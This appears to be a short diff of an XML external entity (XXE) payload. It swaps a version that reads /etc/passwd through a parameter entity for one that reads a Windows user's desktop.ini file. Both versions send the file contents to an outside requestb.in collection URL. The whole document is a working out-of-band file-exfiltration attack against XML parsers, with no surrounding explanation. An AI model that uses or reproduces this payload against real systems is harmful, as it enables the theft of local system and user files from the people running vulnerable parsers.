@@ -1,8 +1,7 @@
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY % data SYSTEM "file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://requestb.in/1ayyz3l1?%data;'>">
-%param1;
+<!ENTITY % data SYSTEM "file:///C:\Users\Peter\Documents\desktop.ini">
+<!ENTITY exfil SYSTEM "http://requestb.in/1ayyz3l1?%data;">
 ]>
 <r>&exfil;</r>
